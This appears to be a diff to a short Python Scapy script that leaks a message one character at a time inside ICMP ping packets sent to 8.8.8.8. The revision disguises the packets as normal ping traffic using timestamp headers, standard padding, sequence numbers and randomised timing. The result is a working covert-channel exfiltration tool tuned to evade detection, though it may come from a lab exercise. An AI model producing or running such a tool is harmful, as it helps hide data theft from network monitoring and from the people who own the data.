@@ -1,4 +1,4 @@
-from scapy.all import *
+from scapy.all import IP, ICMP, send, Raw
 import time
 import os
 import random
@@ -7,16 +7,20 @@ import sys
 message = sys.argv[1]
 
 def send_data(data):
-    for char in data:
-        random_size = random.randint(30,47)
-        filled = os.urandom(random_size)
+    for idx, char in enumerate(data):
+        timestamp = int(time.time())
+        reversed_bytes = timestamp.to_bytes(8, 'little')
 
-        padded_data = char.encode() + filled
+        base_data = bytes(f'{char}\x00\x00', 'utf-8')
+        base_data += os.urandom(5) + bytes(range(0x10, 0x38))
+        
+        payload = reversed_bytes + base_data
 
-        pkt = IP(dst="8.8.8.8")/ICMP()/Raw(load=padded_data)
+        pkt = IP(dst="8.8.8.8")/ICMP(seq=idx, id=random.randint(0, 65535))/Raw(load=payload)
+
         send(pkt)
 
-        time.sleep(random.randint(1,2))
+        time.sleep(random.uniform(0.5, 2.0))
 
 send_data(message)        
 print("\nMensaje enviado")
